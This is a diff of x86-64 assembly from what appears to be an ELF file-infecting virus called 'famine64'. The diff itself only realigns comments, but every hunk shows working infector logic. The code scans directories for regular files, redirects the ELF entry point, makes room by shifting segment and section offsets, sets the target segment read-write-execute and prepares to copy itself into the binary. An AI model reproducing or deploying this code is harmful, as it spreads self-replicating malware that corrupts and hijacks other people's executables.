@@ -75,17 +75,17 @@ loop_file:
 	xor 	rbx, rbx			; RBX will be the offset of each struct dirent64
 	jmp 	check_file_type
 next_file:
-	;; Next struct linux_dirent64*
-	movsx	eax, WORD [rsp + 16 + rbx + 16] 	; 16 is the offset of *dirp->d_reclen
+	;; Next struct linux_dirent64 *
+	movsx	eax, WORD [rsp + 16 + rbx + 16] ; 16 is the offset of *dirp->d_reclen
 	add 	ebx, eax
 	cmp 	DWORD [rsp + 12], ebx
 	jle  	loop_file
 check_file_type:
 	;; Loop throught getdents64() buffer / struct linux_dirent64*
-	cmp 	BYTE [rsp + 16 + rbx + 18], 8 		; 18 is the offset of *dirp->d_type
-	jne 	next_file 	 						; Check if regular file
+	cmp 	BYTE [rsp + 16 + rbx + 18], 8 	; 18 is the offset of *dirp->d_type
+	jne 	next_file 	 					; Check if regular file
 	mov 	rdi, QWORD [rsp]
-	lea 	rsi, [rsp + 16 + rbx + 19]			; 19 is the offset of *dirp->d_name
+	lea 	rsi, [rsp + 16 + rbx + 19]		; 19 is the offset of *dirp->d_name
 	call	get_dat_elf
 	jmp 	next_file
 loop_end:
@@ -371,40 +371,40 @@ check_signature:
 	;; - jump value to launch the program first behavior
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;;
-	mov 	r8, QWORD [rsp + 36] 	; segment addr
-	mov 	r9, QWORD [r8 + 8]	 	; segment->p_offset
-	add 	r9, QWORD [r8 + 32]	 	; + segment->p_filesz
-	mov 	QWORD [rsp + 28], r9 	; -> offset
+	mov 	r8, QWORD [rsp + 36] 		; segment addr
+	mov 	r9, QWORD [r8 + 8]	 		; segment->p_offset
+	add 	r9, QWORD [r8 + 32]	 		; + segment->p_filesz
+	mov 	QWORD [rsp + 28], r9 		; -> offset
 
-	mov 	r8, QWORD [rsp + 36] 	; segment addr
-	mov 	r9, QWORD [r8 + 16]	 	; segment->p_vaddr
-	add 	r9, QWORD [r8 + 32]	 	; + segment->p_filesz
-	mov 	r8, QWORD [rsp + 4]		; char *data
-	sub 	r9, QWORD [r8 + 24]		; data->e_entry
+	mov 	r8, QWORD [rsp + 36] 		; segment addr
+	mov 	r9, QWORD [r8 + 16]	 		; segment->p_vaddr
+	add 	r9, QWORD [r8 + 32]	 		; + segment->p_filesz
+	mov 	r8, QWORD [rsp + 4]			; char *data
+	sub 	r9, QWORD [r8 + 24]			; data->e_entry
 	imul 	r9, -1
-	mov 	QWORD [rsp + 20], r9 	; -> entry jump
+	mov 	QWORD [rsp + 20], r9 		; -> entry jump
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 7. Modify the Elf Header entry point
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	r8, QWORD [rsp + 4]		; char *data
-	mov 	r9, QWORD [rsp + 36]	; Elf64_Phdr *segment
-	mov 	r9, QWORD [r9 + 16]		; *segment->p_vaddr
-	add 	r9, QWORD [rsp + 28]	; + size_t offset
-	mov 	QWORD [r8 + 24], r9		; *data->e_entry = *segment->p_vaddr + offset
+	mov 	r8, QWORD [rsp + 4]			; char *data
+	mov 	r9, QWORD [rsp + 36]		; Elf64_Phdr *segment
+	mov 	r9, QWORD [r9 + 16]			; *segment->p_vaddr
+	add 	r9, QWORD [rsp + 28]		; + size_t offset
+	mov 	QWORD [r8 + 24], r9			; *data->e_entry = *segment->p_vaddr + offset
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 8. Check if we have room to store our code
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	r8, QWORD [rsp + 36] 	; segment addr we infect
-	mov 	r9, QWORD [rsp + 4]		; *data
+	mov 	r8, QWORD [rsp + 36] 		; segment addr we infect
+	mov 	r9, QWORD [rsp + 4]			; *data
 	xor 	r10, r10
-	mov 	r10w, WORD [r9 + 54]	; *data->e_phentsize
-	add 	r10, r8					; next segment
+	mov 	r10w, WORD [r9 + 54]		; *data->e_phentsize
+	add 	r10, r8						; next segment
 
-	mov 	r9, QWORD [r10 + 8]		; next segment->p_offset
-	sub 	r9, QWORD [r8 + 8]		; - isegment->p_offset
-	sub 	r9, QWORD [r8 + 40]		; - isegment->p_filesz
+	mov 	r9, QWORD [r10 + 8]			; next segment->p_offset
+	sub 	r9, QWORD [r8 + 8]			; - isegment->p_offset
+	sub 	r9, QWORD [r8 + 40]			; - isegment->p_filesz
 	cmp 	r9d, DWORD [rel famine64_size]
 	jg  	infect_file_in_padding
 
@@ -417,24 +417,24 @@ compute_padding:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; Modify segments' offset higher than the one we rewrite
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	rdx, QWORD [rsp + 4] 	; *data
-	mov 	r8, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
-	lea 	r8, [rdx + r8]			; Program Header table start
+	mov 	rdx, QWORD [rsp + 4] 		; *data
+	mov 	r8, QWORD [rdx + 32] 		; ->e_phoff (size: 8)
+	lea 	r8, [rdx + r8]				; Program Header table start
 	xor 	rcx, rcx
-	movzx	ecx, WORD [rdx + 56] 	; hdr->e_phnum
+	movzx	ecx, WORD [rdx + 56] 		; hdr->e_phnum
 	xor 	r9 , r9
-	movzx	r9d, WORD [rdx + 54]	; hdr->e_phentsize
+	movzx	r9d, WORD [rdx + 54]		; hdr->e_phentsize
 	imul	rcx, r9
-	add 	rcx, r8 	   			; Program Header table end
-	mov 	r9, QWORD [rsp + 36]	; *segment
-	mov 	r10, QWORD [r9 + 8]		;   segment->p_offset
-	add 	r10, QWORD [r9 + 32]	; + segment->p_filesz
+	add 	rcx, r8 	   				; Program Header table end
+	mov 	r9, QWORD [rsp + 36]		; *segment
+	mov 	r10, QWORD [r9 + 8]			;   segment->p_offset
+	add 	r10, QWORD [r9 + 32]		; + segment->p_filesz
 	;; The first segment of an ELF file is full of \0 so we can skip it...
 next_segment2:
-	add 	r8w, WORD [rdx + 54]	; move to next Program Header segment
-	cmp 	rcx, r8 	 			; end of Program Header segment ?
+	add 	r8w, WORD [rdx + 54]		; move to next Program Header segment
+	cmp 	rcx, r8 	 				; end of Program Header segment ?
 	jle  	modify_sections
-	cmp 	QWORD [r8 + 8], r10 	; seg->p_offset >= iseg->p_offset + iseg->p_filesz ?
+	cmp 	QWORD [r8 + 8], r10 		; seg->p_offset >= iseg->p_offset + iseg->p_filesz ?
 	jl  	next_segment2
 	add 	QWORD [r8 + 8], rax
 	jmp  	next_segment2
@@ -443,20 +443,20 @@ next_segment2:
 	;; Modify sections' offset higher than the one we rewrite
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 modify_sections:
-	mov 	r8, QWORD [rdx + 40] 	; ->e_shoff (size: 8)
-	lea 	r8, [rdx + r8]			; Section Header table start
+	mov 	r8, QWORD [rdx + 40] 		; ->e_shoff (size: 8)
+	lea 	r8, [rdx + r8]				; Section Header table start
 	xor 	rcx, rcx
-	movzx	ecx, WORD [rdx + 60] 	; hdr->e_shnum
+	movzx	ecx, WORD [rdx + 60] 		; hdr->e_shnum
 	xor 	r9 , r9
-	movzx	r9d, WORD [rdx + 58]	; hdr->e_shentsize
+	movzx	r9d, WORD [rdx + 58]		; hdr->e_shentsize
 	imul	rcx, r9
-	add 	rcx, r8 	   			; Program Header table end
+	add 	rcx, r8 	   				; Program Header table end
 	;; The first section of an ELF file is full of \0 so we can skip it...
 next_section2:
-	add 	r8w, WORD [rdx + 58]	; move to next Section Header segment
-	cmp 	rcx, r8 	 			; end of Program Header segment ?
+	add 	r8w, WORD [rdx + 58]		; move to next Section Header segment
+	cmp 	rcx, r8 	 				; end of Program Header segment ?
 	jle  	modify_shoff
-	cmp 	QWORD [r8 + 24], r10 	; sect->sh_offset >= iseg->p_offset + iseg->p_filesz ?
+	cmp 	QWORD [r8 + 24], r10 		; sect->sh_offset >= iseg->p_offset + iseg->p_filesz ?
 	jl  	next_section2
 	add 	QWORD [r8 + 24], rax
 	jmp  	next_section2
@@ -475,13 +475,13 @@ infect_file_add_padding:
 	;; 4     , 8         , 8          , 8           , 8            , 8            , 144
 	;; [rsp] , [rsp + 4] , [rsp + 12] , [rsp + 20]  , [rsp + 28]   , [rsp + 36]   , [rsp + 44]
 	mov 	r8, QWORD [rsp + 36]
-	add 	QWORD [r8 + 32], rax 	; *segment->p_filesz += padding
-	add 	QWORD [r8 + 40], rax 	; *segment->p_memsz += padding
+	add 	QWORD [r8 + 32], rax 		; *segment->p_filesz += padding
+	add 	QWORD [r8 + 40], rax 		; *segment->p_memsz += padding
 	xor 	r9, r9
-	or  	r9, 1					; segment R permission
-	or  	r9, 2					; segment W permission
-	or  	r9, 4					; segment X permission
-	mov 	DWORD [r8 + 4], r9d		; *segment->p_flags
+	or  	r9, 1						; segment R permission
+	or  	r9, 2						; segment W permission
+	or  	r9, 4						; segment X permission
+	mov 	DWORD [r8 + 4], r9d			; *segment->p_flags
 
 	mov 	QWORD [rsp + 44], rax
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -531,13 +531,13 @@ infect_file_in_padding:
 	;; R8 contains segment we infect
 	xor 	r9, r9
 	mov 	r9d, DWORD [rel famine64_size]
-	add 	QWORD [r8 + 32], r9		; segment->p_filesz += famine64_size
-	add 	QWORD [r8 + 40], r9		; segment->p_memsz += famine64_size
+	add 	QWORD [r8 + 32], r9			; segment->p_filesz += famine64_size
+	add 	QWORD [r8 + 40], r9			; segment->p_memsz += famine64_size
 	xor 	r9, r9
-	or  	r9, 1					; segment R permission
-	or  	r9, 2					; segment W permission
-	or  	r9, 4					; segment X permission
-	mov 	DWORD [r8 + 4], r9d		; segment->p_flags
+	or  	r9, 1						; segment R permission
+	or  	r9, 2						; segment W permission
+	or  	r9, 4						; segment X permission
+	mov 	DWORD [r8 + 4], r9d			; segment->p_flags
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 10. Time to rewrite the excutable
